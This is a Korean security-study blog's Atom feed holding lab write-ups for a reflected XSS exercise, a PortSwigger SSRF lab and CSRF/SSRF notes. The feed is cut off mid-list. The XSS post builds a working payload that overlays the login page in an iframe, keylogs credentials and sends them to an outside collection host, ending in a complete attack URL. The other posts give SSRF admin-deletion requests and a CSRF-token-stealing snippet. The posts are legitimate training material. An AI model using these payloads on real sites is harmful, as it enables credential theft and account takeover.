<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-29T04:57:45+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyEnOuyhCA6IOu5hOygleyDgSDtjpjsnbTsp4Ag7YyM652866-47YSw66W8IOuEo-ydgCDsiJjrn4kg7JqU7LKtXG7shJzrsoQgLT4-IOuCtOu2gCDshJzrsoQgOiDrgrTrtoAg7Y6Y7J207KeAIOyalOyyrVxu64K067aAIOyEnOuyhCAtPj4g7ISc67KEIDog64K067aAIO2OmOydtOyngCDsnZHri7VcbuyEnOuyhCAtPj4g6rO16rKp7J6QIDog64K067aAIO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">XSS 실습 7번</title><link href="http://localhost:4000/XSS7%EB%B2%88%EB%AC%B8%EC%A0%9C/" rel="alternate" type="text/html" title="XSS 실습 7번" /><published>2023-05-29T00:00:00+09:00</published><updated>2023-05-29T23:13:00+09:00</updated><id>http://localhost:4000/XSS7%EB%B2%88%EB%AC%B8%EC%A0%9C</id><content type="html" xml:base="http://localhost:4000/XSS7%EB%B2%88%EB%AC%B8%EC%A0%9C/"><![CDATA[<h2 id="xss-란">XSS 란?</h2>
<ul>
  <li>크라이언트 측 스크립트를 삽입하는 공격이다.</li>
</ul>

<h2 id="xss-7번-문제">XSS 7번 문제</h2>
<ul>
  <li>키로거를 삽입하여 사용자의 계정을 탈취하는 문제이다.</li>
</ul>

<h2 id="사이트-분석-및-취약점-탐색">사이트 분석 및 취약점 탐색</h2>

<h3 id="로그인">로그인</h3>
<ul>
  <li>POST 와 GET 두 방식으로 로그인이 가능하다.</li>
</ul>

<h3 id="로그인-실패-페이지">로그인 실패 페이지</h3>
<ul>
  <li>XSS 취약점이 존재한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/7654383c-c4bd-441c-aef4-5b3de1abd353" alt="Pasted image 20230529012624" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d8efcad7-ebd2-45f6-8532-6d6a18772543" alt="Pasted image 20230529012643" /></li>
  <li>아이디 대신 스크립문을 삽입할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/bc4ab412-10ca-453e-8aca-15254576ec26" alt="Pasted image 20230529013321" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/13cd15a9-8863-4135-9098-c5611767d780" alt="Pasted image 20230529013241" /></li>
</ul>

<h2 id="공격-시나리오">공격 시나리오</h2>
<ol>
  <li>login.html 에서 사용자가 로그인을 시도하는 것이 아닌 login.php에서 사용자가 로그인을 시도하도록 하자.</li>
  <li>login.php의 XSS 취약점을 이용하여 키로그를 삽입한다.</li>
  <li>사용자에게 공격자가 준 링크를 통해 페이지에 방문하여 로그인 하도록 해야한다.</li>
</ol>

<h2 id="공격-시작">공격 시작</h2>
<ol>
  <li>alert 창 안뜨게 만들기. 첫번째 스크립트는 일부러 오류를 유발시켜 동작안되도록 하였다. 따라서 <code class="language-plaintext highlighter-rouge">alert(1)</code> 이 경고창으로 뜨는 것을 확인할 수 있다.
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">[ id</span><span class="dl">'</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="c1">// ] ~~~');</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;script&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="dl">'</span><span class="s1">login.html</span><span class="dl">'</span><span class="p">;</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div>    </div>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>완성 공격문 = id'&lt;/script&gt;&lt;script&gt;alert(1);//
</code></pre></div>    </div>
    <p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/343cd063-2ed6-4cc2-8611-ead3b5e960b3" alt="Pasted image 20230529015248" /></p>
  </li>
  <li><code class="language-plaintext highlighter-rouge">href</code> 를 통해 자동으로 리다이렉트 형상 막기. html 주석 처리 기능을 이용하여 <code class="language-plaintext highlighter-rouge">href</code> 스크립트 부부을 주석처리 해준다. 확인 버튼을 눌러도 <code class="language-plaintext highlighter-rouge">login.html</code> 로 리다이렉션하지 않고 <code class="language-plaintext highlighter-rouge">login.php</code> 에 머문다.
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">[ id</span><span class="dl">'</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span><span class="c">&lt;!--// ] ~~~');
&lt;/script&gt;
&lt;script&gt;window.location.href='login.html';&lt;/script&gt;
</span></code></pre></div>    </div>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>완성 공격문 = id'&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;!--//
</code></pre></div>    </div>
    <p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/869eb7fb-9a97-44c7-801c-7b6686f08df2" alt="Pasted image 20230529020238" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d92d7de7-328b-4ba7-a497-1d1465e2f677" alt="Pasted image 20230529020302" /></p>
  </li>
  <li>사용자는 정상적인 로그인 페이지가 보여야한다. 따라서 <code class="language-plaintext highlighter-rouge">iframe</code> 을 통해 로그인 창 보이게 한다. 공격문을 id에 넣고 로그인을 하면 <code class="language-plaintext highlighter-rouge">login.php</code> 에서 로그인 페이지가 나오는 것을 확인할 수 있다.
<script src="https://gist.github.com/MinGyu2/e2b89c91fab5b1368f8bc58efd245e22.js"></script>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>완성 공격문 =
id'&lt;/script&gt;&lt;iframe style="position:absolute;border:none;overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;top:0px;left:0px;right:0px;bottom:0px" src='login.html'&gt;&lt;/iframe&gt;&lt;!--//
</code></pre></div>    </div>
    <p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/5e9676ba-637a-4b09-8913-16a4e8f78c7d" alt="Pasted image 20230529022346" /></p>
  </li>
  <li>사용자가 입력하는 아이디와 비번을 알아내기위한 키로거를 넣어보자. 그리고 키로거를 이용하여 사용자 입력을 200ms 주기로 콘솔에 출력해보자.
<script src="https://gist.github.com/MinGyu2/c2557af1a361f188bfc86138b17b17d0.js"></script><br /><script src="https://gist.github.com/MinGyu2/d0cd73f4feb2e940ea44d7d8b5cbae57.js"></script>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>공격문 = 
id'&lt;/script&gt;&lt;iframe style="position:absolute;border:none;overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;top:0px;left:0px;right:0px;bottom:0px" src='login.html' onload='load()'&gt;&lt;/iframe&gt;&lt;script&gt;var keys = "";function load(){var win = document.getElementsByTagName('iframe')[0].contentWindow;win.onkeydown=(e)=&gt;{key = e.keyCode?e.keyCode:e.charCode;key = String.fromCharCode(key);keys += key;}}window.setInterval(function(){if(keys != ''){console.log(keys);keys='';}}, 200);&lt;/script&gt;&lt;!--//
</code></pre></div>    </div>
    <p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f83fc784-7b5c-4f08-bf73-10774b39ad7c" alt="Pasted image 20230529030914" /><br />
<img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/a58cfab3-8e93-481b-8246-efcd720ff3d9" alt="Pasted image 20230529030931" /></p>
  </li>
  <li>공격자 서버로 사용자 입력 보내기. 사용자의 입력을 <code class="language-plaintext highlighter-rouge">Image</code> 를 이용하여 공격자 서버로 보낸다.
<script src="https://gist.github.com/MinGyu2/66fcfc1763b5cb43c951ba7c39a6cc33.js"></script>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>공격문 = 
id'&lt;/script&gt;&lt;iframe style="position:absolute;border:none;overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;top:0px;left:0px;right:0px;bottom:0px" src='login.html' onload='load()'&gt;&lt;/iframe&gt;&lt;script&gt;var keys = "";var hackURL = "https://envs1y92en6c.x.pipedream.net/?v=";function load(){var win = document.getElementsByTagName('iframe')[0].contentWindow;win.onkeydown=(e)=&gt;{key = e.keyCode?e.keyCode:e.charCode;key = String.fromCharCode(key);keys += key;}}window.setInterval(function(){if(keys != ''){new Image().src = hackURL+keys;keys='';}}, 1000);&lt;/script&gt;&lt;!--//
</code></pre></div>    </div>
    <p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d451186b-0c43-4949-9dae-dad6b2bb8617" alt="Pasted image 20230529035800" />
<img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/816c929e-21b6-4a90-92c9-0ad7a4c7aad0" alt="Pasted image 20230529040046" />
<img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/be7c8f83-620d-4cfa-9227-a3b70eef1dd8" alt="Pasted image 20230529035816" /></p>
  </li>
  <li>로그인에 성공하면 실제 메인 페이지를 보여줘야 의심이 안간다. 즉 로그인에 실패하면 iframe 내에서 로그인을 다시 시도해야하고, 성공하면 정상적으로 로그인 성공한 것으로 보이기위하여 <code class="language-plaintext highlighter-rouge">index.php</code>로 이동한다.<br /><script src="https://gist.github.com/MinGyu2/81cbf0b824103cc9bc0c0c1f5a52b64f.js"></script>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>공격문 = 
id'&lt;/script&gt;&lt;iframe style="position:absolute;border:none;overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;top:0px;left:0px;right:0px;bottom:0px" src='login.html' onload='load()'&gt;&lt;/iframe&gt;&lt;script&gt;var keys = "";var hackURL = "https://enhrvcr5t8jsk.x.pipedream.net/?v=";function load(){var win = document.getElementsByTagName('iframe')[0].contentWindow;var s = win.location.href;if(s!='http://ctf.segfaulthub.com:4343/xss_7/login.html'){location.href="index.php";new Image().src = hackURL+"success";}else{new Image().src = hackURL+"fail";}win.onkeydown=(e)=&gt;{key = e.keyCode?e.keyCode:e.charCode;key = String.fromCharCode(key);keys += key;}}window.setInterval(function(){if(keys != ''){new Image().src = hackURL+keys;keys='';}}, 1000);&lt;/script&gt;&lt;!--//
</code></pre></div>    </div>
    <ul>
      <li>로그인 성공<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/596bb9cf-ad96-4863-acc8-d76a3188bfa5" alt="Pasted image 20230529042336" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/e874aec8-af9e-48d5-b053-49bd57473b6b" alt="Pasted image 20230529042328" /></li>
      <li>로그인 실패<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/917e710b-4fba-491c-8e49-4a4db21c3fee" alt="Pasted image 20230529042229" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/308c8ff8-386d-4547-a168-940215b06ce7" alt="Pasted image 20230529042237" /></li>
    </ul>
  </li>
  <li>로그인을 GET요청으로 할 수 있음으로 Reflected XSS 취약점으로 활용할 수있다. 따라서 Get요청으로 공격하기 위해서 id 파라미터에 공격 스크립트를 넣어 링크를 눌러 사용자가 접속하여 로그인 하도록 유도 하면 된다.
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://ctf.segfaulthub.com:4343/xss_7/login.php?id=id%27%3C%2Fscript%3E%3Ciframe+style%3D%22position%3Aabsolute%3Bborder%3Anone%3Boverflow%3Ahidden%3Boverflow-x%3Ahidden%3Boverflow-y%3Ahidden%3Bheight%3A100%25%3Bwidth%3A100%25%3Btop%3A0px%3Bleft%3A0px%3Bright%3A0px%3Bbottom%3A0px%22+src%3D%27login.html%27+onload%3D%27load%28%29%27%3E%3C%2Fiframe%3E%3Cscript%3Evar+keys+%3D+%22%22%3Bvar+hackURL+%3D+%22https%3A%2F%2Fenhrvcr5t8jsk.x.pipedream.net%2F%3Fv%3D%22%3Bfunction+load%28%29%7Bvar+win+%3D+document.getElementsByTagName%28%27iframe%27%29%5B0%5D.contentWindow%3Bvar+s+%3D+win.location.href%3Bif%28s%21%3D%27http%3A%2F%2Fctf.segfaulthub.com%3A4343%2Fxss_7%2Flogin.html%27%29%7Blocation.href%3D%22index.php%22%3Bnew+Image%28%29.src+%3D+hackURL%2B%22success%22%3B%7Delse%7Bnew+Image%28%29.src+%3D+hackURL%2B%22fail%22%3B%7Dwin.onkeydown%3D%28e%29%3D%3E%7Bkey+%3D+e.keyCode%3Fe.keyCode%3Ae.charCode%3Bkey+%3D+String.fromCharCode%28key%29%3Bkeys+%2B%3D+key%3B%7D%7Dwindow.setInterval%28function%28%29%7Bif%28keys+%21%3D+%27%27%29%7Bnew+Image%28%29.src+%3D+hackURL%2Bkeys%3Bkeys%3D%27%27%3B%7D%7D%2C+1000%29%3B%3C%2Fscript%3E%3C%21--%2F%2F&amp;pw=123
</code></pre></div>    </div>
  </li>
  <li>사용자가 로그인 창에 아이디와 비밀번호를 입력하면 공격자 서버로 아이디와 비밀번호가 전송된다. <br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/aecb22ef-f21a-4517-9ec9-3fb4f6d57a1e" alt="Pasted image 20230529042638" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/a2ddcfb2-659d-4efb-8db6-9cf70beb8ff7" alt="Pasted image 20230529042652" /></li>
</ol>

<h2 id="후기">후기</h2>
<ul>
  <li>키로거를 사용하여 공격자 서버로 직접 사용자의 입력을 받아보았다. url을 주의깊게 보지않는이상 사용자는 이상있는지 확인하기 어렵다는 것을 알 수 있었다. 키로거를 이용한 새로운 공격이라 흥미로웠다.</li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="Reflected XSS" /><summary type="html"><![CDATA[XSS 실습 7번 문제를 풀어보자.]]></summary></entry><entry><title type="html">SSRF 실습 문제 Basic SSRF</title><link href="http://localhost:4000/SSRF%EC%8B%A4%EC%8A%B5%EB%AC%B8%EC%A0%9CBasicSSRF/" rel="alternate" type="text/html" title="SSRF 실습 문제 Basic SSRF" /><published>2023-05-27T00:00:00+09:00</published><updated>2023-05-27T23:13:00+09:00</updated><id>http://localhost:4000/SSRF%EC%8B%A4%EC%8A%B5%EB%AC%B8%EC%A0%9CBasicSSRF</id><content type="html" xml:base="http://localhost:4000/SSRF%EC%8B%A4%EC%8A%B5%EB%AC%B8%EC%A0%9CBasicSSRF/"><![CDATA[<h2 id="ssrf-란">SSRF 란?</h2>
<ul>
  <li>서버가 임의의 요청을 보내도록 하는 공격이다.</li>
</ul>

<h2 id="ssrf-문제">SSRF 문제</h2>
<ul>
  <li><a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost">Lab: Basic SSRF against the local server Web Security Academy</a></li>
</ul>

<h2 id="문제-내용">문제 내용</h2>
<ul>
  <li>수량 체크를 하기위해 내부 시스템으로 부터 데이터를 가지고온다.</li>
  <li>문제를 해결하기 위해서는 <code class="language-plaintext highlighter-rouge">http://localhost/admin</code> 에 접근하여 <code class="language-plaintext highlighter-rouge">carlos</code> 유저를 삭제해야 한다.</li>
</ul>

<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/9b364c73-85b0-4f2a-a73e-5631530108f2" alt="Pasted image 20230527001755" /></p>

<h2 id="문제-풀이">문제 풀이</h2>

<h3 id="사이트-분석-및-취약점-찾기">사이트 분석 및 취약점 찾기</h3>

<h4 id="상품-수량-체크부분">상품 수량 체크부분</h4>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOygleyDgeyggSDsiJjrn4kg7JqU7LKtXG7shJzrsoQgLT4-IOuCtOu2gCDshJzrsoQgOiDrp4Htgazrpbwg7Ya17ZW0IOuCtOu2gCDtjpjsnbTsp4Ag7IiY65-JIOyalOyyrS5cbuuCtOu2gCDshJzrsoQgLT4-IOyEnOuyhCA6IOyImOufiSDsnZHri7UuXG7shJzrsoQgLT4-IOyCrOyaqeyekCA6IOyImOufiSDsnZHri7UuIiwibWVybWFpZCI6bnVsbH0" /></p>
<ul>
  <li>
    <p>상품 수량 체크부분 POST요청의 파라미터로 URL을 넣어 요청을 보낸다. 즉 이 부분에서 SSRF 공격을 시도할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f524fe2c-5897-4609-99d4-13cf520f00af" alt="Pasted image 20230527005245" />
<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4b5fcdad-9c15-4476-ba8a-6d15e871f04a" alt="Pasted image 20230527004914" />
<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f6958d20-01a0-4146-85f3-10fa5ac1d1cc" alt="Pasted image 20230527005001" /></p>
  </li>
  <li>
    <p>오직 POST 요청으로만 수량을 체크할 수 있다. GET 요청을 보냈을 때 수량을 체크할 수가 없다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8c0aa1bc-d813-4ffd-a0c0-278bb16187e6" alt="Pasted image 20230527005515" /></p>
  </li>
</ul>

<h4 id="admin-페이지-접속-시도">admin 페이지 접속 시도</h4>
<ul>
  <li><code class="language-plaintext highlighter-rouge">https://문제 주소/admin</code> 을 통해 바로 접속을 시도해 보았다. 하지만 admin 페이지에 접속하기 위해서는 <code class="language-plaintext highlighter-rouge">administrator</code>로 로그인 하거나 내부에서 접속해야 한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0656feeb-8612-43ea-9104-5834bc6fa8de" alt="Pasted image 20230527005910" /></li>
</ul>

<h3 id="공격-시나리오">공격 시나리오</h3>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyEnOuyhCA6IOu5hOygleyDgSDtjpjsnbTsp4Ag7YyM652866-47YSw66W8IOuEo-ydgCDsiJjrn4kg7JqU7LKtXG7shJzrsoQgLT4-IOuCtOu2gCDshJzrsoQgOiDrgrTrtoAg7Y6Y7J207KeAIOyalOyyrVxu64K067aAIOyEnOuyhCAtPj4g7ISc67KEIDog64K067aAIO2OmOydtOyngCDsnZHri7VcbuyEnOuyhCAtPj4g6rO16rKp7J6QIDog64K067aAIO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>
<ol>
  <li>서버로 수량 체크 요청을 보낼 때 수량을 체크하기 위한 링크가 아닌 서버 내부 페이지 URL를 파라미터에 넣어 요청을 보낸다.</li>
  <li>서버에서 파라미터에 들어있는 URL주소로 요청을 보낸다.</li>
  <li>서버는 URL주소 응답을 받는다.</li>
  <li>서버는 공격자에게 URL 페이지 응답을 그대로 사용자에게 보내준다.</li>
</ol>

<h3 id="admin-페이지-접속-공격">admin 페이지 접속 공격</h3>
<ol>
  <li><code class="language-plaintext highlighter-rouge">stockApi</code> 파라미터에 <code class="language-plaintext highlighter-rouge">http://localhost/admin</code> 주소를 입력해 준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d9bd18c0-c348-452a-9461-5b447cea2613" alt="Pasted image 20230527013431" /></li>
  <li>Post 요청을 보내면 <code class="language-plaintext highlighter-rouge">http://localhost/admin</code> 페이지가 나타난다. 이 페이지는 서버 내부에서 접속된 페이지이다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/78ea87bd-3af3-49f8-901f-ef992bb0e96b" alt="Pasted image 20230527013531" /></li>
  <li>admin 페이지 접속에 성공하였다. 이제 <code class="language-plaintext highlighter-rouge">carlos</code> 유저를 삭제하면 된다. 즉 위의 사진에서 보이듯 <code class="language-plaintext highlighter-rouge">Delete</code>  링크를 눌러줘야한다. 하지만 바로 누르면 외부에서 요청한 것이라 동작을 안한다. 따라서 파라미터에 <code class="language-plaintext highlighter-rouge">Delete링크</code>를 넣어 요청을 보내주면 된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8c857d16-ae1a-43b1-9554-d6a120b4857b" alt="Pasted image 20230527014116" /></li>
</ol>

<h3 id="유저-삭제하기">유저 삭제하기</h3>
<ol>
  <li><code class="language-plaintext highlighter-rouge">stockApi</code> 파라미터에 <code class="language-plaintext highlighter-rouge">http://localhost/admin/delete?username=wiener</code> 링크를 입력해 준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/9a578c2c-cf4c-4a87-84b6-b1ac926dce87" alt="Pasted image 20230527014517" /></li>
  <li>Post 요청을 보내면 성공적으로 <code class="language-plaintext highlighter-rouge">wiener</code> 유저가 삭제되었다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/7fedaef1-78ee-4b7a-9688-272fa5f7a01b" alt="Pasted image 20230527014556" /></li>
  <li>목표는 <code class="language-plaintext highlighter-rouge">carlos</code> 유저를 삭제하는 것이다. 따라서 <code class="language-plaintext highlighter-rouge">carlos</code> 를 링크에 넣어주자. 그러면 <code class="language-plaintext highlighter-rouge">stockApi</code> 파라미터에는 <code class="language-plaintext highlighter-rouge">http://localhost/admin/delete?username=carlos</code> 가 들어가게 된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/9061f31e-2a9a-4dc0-b986-1b01007c2a51" alt="Pasted image 20230527015033" /></li>
  <li>Post 요청을 보내면 목표였던  <code class="language-plaintext highlighter-rouge">carlos</code> 유저가 삭제된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d34a3ef7-cc64-4595-b6a3-05f7e26bb06a" alt="Pasted image 20230527015153" /></li>
</ol>

<h2 id="후기">후기</h2>
<ul>
  <li>직접 스터디에서 풀이해 주었지만 직접 SSRF 문제를 풀어보니 파라미터로 URL을 입력받는 것이 얼마나 위험한지 알 수 있었다. SSRF 취약점을 이용하면 외부에서 접근이 불가능한 내부 페이지에 접속을 직접 확인할 수 있어 재밌었다.</li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="SSRF" /><category term="웹 해킹" /><summary type="html"><![CDATA[SSRF 실습 문제 Basic SSRF 문제를 풀어보자.]]></summary></entry><entry><title type="html">CSRF 와 SSRF</title><link href="http://localhost:4000/CSRF%EC%99%80SSRF/" rel="alternate" type="text/html" title="CSRF 와 SSRF" /><published>2023-05-26T00:00:00+09:00</published><updated>2021-05-26T23:13:00+09:00</updated><id>http://localhost:4000/CSRF%EC%99%80SSRF</id><content type="html" xml:base="http://localhost:4000/CSRF%EC%99%80SSRF/"><![CDATA[<h2 id="csrf-공격">CSRF 공격</h2>

<h3 id="설명">설명</h3>
<ul>
  <li>Cross Site Request Forgery</li>
  <li>피해자가 임의의 요청을 서버에 보내게하는 공격이다.</li>
</ul>

<h3 id="발생-위치">발생 위치</h3>
<ul>
  <li>모든 요청에서 방생할 수 있다.</li>
  <li>중요한 요청에서 발생할 수 있다.</li>
  <li>게시판 글 작성 CSRF or 비밀번호 변경 CSRF ( 상황에 따라 위험도가 달라질 수 있다.)</li>
</ul>

<h3 id="csrf-공격-기법">CSRF 공격 기법</h3>
<h4 id="get-method">GET Method</h4>
<ul>
  <li>URL 링크를 만들어 사용자에게 보내 클릭하게 만들면 된다.</li>
  <li>로그인 한 다음 볼 수 있는 페이지에 URL를 두고 클릭하게 해야한다.</li>
</ul>

<h4 id="post-method">POST Method</h4>
<ul>
  <li>무조건 XSS 취약점을 같은 도메인에서 찾아야 한다. 왜냐하면 같은 도메인이어야 로그인 세션이 그대로 남아있기 때문이다. ( 쿠키 값 유지 )</li>
</ul>

<h4 id="referer-bypass-포인트">Referer Bypass 포인트</h4>
<ul>
  <li>meta 태그를 이용하여 우회를 시도할 수 있다.</li>
  <li>단 서버에서 referer 값이 없을 때는 검사를 안하고 통과시켜줘야 한다.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"referrer"</span> <span class="na">content=</span><span class="s">"no-referrer"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<h4 id="csrf-token-우회">CSRF Token 우회</h4>
<ul>
  <li>서버에서 랜덤한 CSRF Token을 만들고 세션에 저장한다.</li>
  <li>중요한 요청 페이지에 CSRF Token을 넣어준다.</li>
  <li>공격자는 CSRF Token을 마음대로 만들 수 없다.</li>
  <li>하지만 동일한 도메인에 XSS 취약점이 존재하면 CSRF Token 우회가 가능하다.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"csrf 토큰이 들어있는 페이지"</span> <span class="na">onload=</span><span class="s">"load()"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/iframe&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nf">load</span><span class="p">(){</span>
	<span class="kd">var</span> <span class="nx">value</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">csrf_token</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<h3 id="csrf-대응방안">CSRF 대응방안</h3>
<ul>
  <li>지키고자하는 요청에서 <strong>인증정보 추가</strong>하기. (예: 옛날 비밀번호 한번더 입력 , 문자 인증 번호 등 … )</li>
  <li>애매한 요청 (예: 게시판) 일 때는 Referer Check, CSRF Token을 추가하기.</li>
</ul>

<h2 id="ssrf-공격">SSRF 공격</h2>
<h3 id="설명-1">설명</h3>
<ul>
  <li>Server Side Request Forgery</li>
  <li>서버가 임이의 요청을 보내게하는 공격이다.</li>
  <li>많은 API를 사용함으로써 공격하기 더욱 쉬워졌다.</li>
</ul>

<h3 id="발생-위치-1">발생 위치</h3>
<ul>
  <li>파라미터로 URL을 받는 경우.</li>
  <li>서버가 외부 자원(리소스)를 이용하는 곳.</li>
  <li>예 : <code class="language-plaintext highlighter-rouge">view.php?weatherAPI=https://kakao.com/~~~</code></li>
</ul>

<h3 id="서버에서-url-동작-방식">서버에서 URL 동작 방식</h3>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IEFQSeyjvOyGjOqwgCDri7TquLQg7Y6Y7J207KeAIOyalOyyrVxu7ISc67KEIC0-PiBBUEkg7ISc67KEIDog642w7J207YSwIOyalOyyrVxuQVBJIOyEnOuyhCAtPj4g7ISc67KEIDog642w7J207YSwIOydkeuLtVxu7ISc67KEIC0-PiDshJzrsoQgOiDtjpjsnbTsp4Ag66CM642U66eBXG7shJzrsoQgLT4-IOyCrOyaqeyekCA6IO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>
<ol>
  <li>서버가 사용자가 보낸 요청으로 API주소를 받는다.</li>
  <li>서버에서 주소로 요청한다. 즉 데이터를 가지고 온다.</li>
  <li>서버에서 가지고온 데이터를 가지고 페이지를 만들어 사용자에서 응답한다.</li>
</ol>

<h3 id="공격-유형">공격 유형</h3>
<h4 id="서버-내부-접속하기">서버 내부 접속하기</h4>
<ul>
  <li>admin 페이지 접근을 목적으로 한다.</li>
